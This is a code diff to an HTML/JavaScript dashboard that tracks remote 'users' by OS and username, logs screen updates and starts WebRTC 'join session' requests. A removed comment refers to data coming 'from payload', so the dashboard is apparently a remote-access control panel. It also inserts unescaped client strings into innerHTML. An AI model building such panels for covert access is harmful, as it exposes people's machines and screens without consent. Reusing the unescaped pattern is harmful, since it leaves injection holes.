@@ -11,6 +11,7 @@
         .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
         .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; }
         .btn:hover { background: #2563eb; }
+        .btn.active { background: #10b981; } /* Green for active session */
 
         /* Logs Container */
         #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
@@ -25,7 +26,8 @@
         .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
         .status-online { background-color: #4ade80; }
         .status-offline { background-color: #94a3b8; }
-        
+        .status-connecting { background-color: #fbbf24; }
+
         .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
     </style>
 </head>
@@ -46,7 +48,7 @@
         const wsUrl = `${protocol}//${host}/`;
 
         const ws = new WebSocket(wsUrl);
-        let users = {}; // This will mirror the server's knownUsers
+        let users = {}; 
         let isConnected = false;
 
         ws.onopen = () => {
@@ -67,16 +69,14 @@
                     addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
                 }
                 else if (data.type === 'info') {
-                    // Handle info packets from payload
                     addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`, 'green');
-
-                    // Add to grid
                     if (!users[data.id]) {
-                        users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now() };
+                        users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now(), sessionActive: false };
                     } else {
                         users[data.id].status = 'Online';
                         users[data.id].info = data;
                         users[data.id].lastSeen = Date.now();
+                        users[data.id].sessionActive = false; // Reset session on reconnect
                     }
                     renderUsers();
                 }
@@ -93,7 +93,7 @@
                 else if (data.type === 'screen_data') {
                     addLog(`📺 Screen update from ${data.id}`, 'blue');
                     if (!users[data.id]) {
-                        users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
+                        users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
                     }
                     users[data.id].lastSeen = Date.now();
                     renderUsers();
@@ -105,11 +105,20 @@
                     addLog(`[SIG] Received ${data.type} from ${data.targetId || data.id}`, 'blue');
                     const userId = data.targetId || data.id;
                     if (!users[userId]) {
-                        users[userId] = { status: 'Connecting...', logs: [], info: {}, lastSeen: Date.now() };
+                        users[userId] = { status: 'Connecting...', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
                     }
                     users[userId].signalingData = data;
                     users[userId].lastSeen = Date.now();
                     renderUsers();
+                }
+                else if (data.type === 'session_active') {
+                    // Mark this user as having an active session
+                    if (users[data.agentId]) {
+                        users[data.agentId].sessionActive = true;
+                        users[data.agentId].status = 'Online';
+                        renderUsers();
+                        addLog(`[SESSION] Active session established with ${data.agentId}`, 'green');
+                    }
                 }
                 else {
                     // Generic fallback
@@ -117,7 +126,7 @@
                         addLog(`[${data.targetId || data.id}] Received: ${data.type}`, 'blue');
                         const userId = data.targetId || data.id;
                         if (!users[userId]) {
-                            users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
+                            users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
                         }
                         users[userId].logs.push(data.type);
                         users[userId].lastSeen = Date.now();
@@ -165,19 +174,33 @@
 
                 const osInfo = data.info ? `${data.info.os || 'Unknown'} / ${data.info.user || 'Unknown'}` : 'Unknown OS';
                 const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
-                const statusColor = data.status === 'Online' ? 'status-online' : 'status-offline';
+                
+                let statusColor = 'status-offline';
+                let btnText = 'Join Session';
+                let btnClass = '';
+                
+                if (data.status === 'Online') {
+                    statusColor = 'status-online';
+                    if (data.sessionActive) {
+                        btnText = 'Reconnect Session';
+                        btnClass = 'active';
+                    }
+                } else if (data.status === 'Connecting...') {
+                    statusColor = 'status-connecting';
+                    btnText = 'Connecting...';
+                }
 
                 card.innerHTML = `
                     <strong>User ID: ${id}</strong><br>
                     <span class="status-dot ${statusColor}"></span> Info: ${osInfo}<br>
                     Last Seen: ${lastSeen}<br>
-                    <button class="btn" onclick="joinUser('${id}')">Join Session</button>
+                    <button class="btn ${btnClass}" onclick="joinUser('${id}', '${data.status}')">${btnText}</button>
                 `;
                 grid.appendChild(card);
             }
         }
 
-        function joinUser(id) {
+        function joinUser(id, status) {
             // If we have stored signaling data, send it back to the target
             if (users[id] && users[id].signalingData) {
                 const sigData = users[id].signalingData;
@@ -187,18 +210,19 @@
                     sdp: sigData.sdp,
                     candidate: sigData.candidate
                 }));
-                addLog(`[ADMIN] Sent ${sigData.type} to ${id}`, 'green');
+                addLog(`[ADMIN] Resent ${sigData.type} to ${id}`, 'green');
             } else {
-                // Request a join
+                // Request a new join
                 ws.send(JSON.stringify({
                     type: 'request_join',
                     targetId: id,
-                    from: null 
+                    from: null
                 }));
-                addLog(`[ADMIN] Requested join to ${id}`, 'blue');
+                addLog(`[ADMIN] Requested new join to ${id}`, 'blue');
             }
-            
-            const card = document.querySelector(`button[onclick="joinUser('${id}')"]`).parentElement;
+
+            // Visual feedback
+            const card = document.querySelector(`button[onclick="joinUser('${id}', '${status}')"]`).parentElement;
             card.style.borderColor = '#4ade80';
             setTimeout(() => card.style.borderColor = '#3b82f6', 500);
         }
